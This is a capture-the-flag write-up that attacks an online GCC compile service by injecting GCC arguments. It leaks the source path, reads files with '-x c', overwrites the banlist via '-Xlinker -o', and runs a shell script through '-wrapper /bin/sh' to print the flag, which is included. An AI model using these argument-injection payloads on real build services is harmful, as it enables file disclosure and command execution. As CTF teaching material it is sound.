# GCC on fire

The application permits to compile C code using GCC. It allows the user to pass custom command-line arguments and environment variables to GCC but it has filter (`banlist.txt`).

## Steps
0. Try `-wrapper` but you get `Error: -wrapper is banned in the banlist.txt`

1. Throw an error to get the path of `__init__.py`:
Using `--help`, we get:
```
Traceback (most recent call last):
  File "/data/app/__init__.py", line 72, in compile_code
    with open(file_name[:-2], 'rb') as binary_file:
```
Indicating the source code of the application is in `/data/app/__init__.py`

2. Read source code using (https://gtfobins.github.io/gtfobins/gcc/):
```sh
-x c /data/app/__init__.py
```
We get:
```
...
/data/app/__init__.py:47:19: warning: character constant too long for its type
   47 |         with open('/data/15e94765365729ab9599cd8ba2a4634aa8bcd9ec3961daf633f611d9f575a48b/banlist.txt', 'r') as banlist_file:
...
```
So the banlist file is located at `/data/15e94765365729ab9599cd8ba2a4634aa8bcd9ec3961daf633f611d9f575a48b/banlist.txt` (you can try reading it)

3. Clear file banlist.txt using
```sh
-Xlinker -o/data/15e94765365729ab9599cd8ba2a4634aa8bcd9ec3961daf633f611d9f575a48b/banlist.txt
```
4. Print info using 
```
#!/bin/bash
cat /data/flag*
```

```
-wrapper /bin/sh,/tmp/b4a83739afac54d02a6175cb331c8e0bbc81f5fc69b3a9b7dc3a8a333da26f63.c
```

Flag: `GCC{gcc_1s_f0r_GNU_Compiler_Collection_0r_Galettes_Cidre_CTF???}`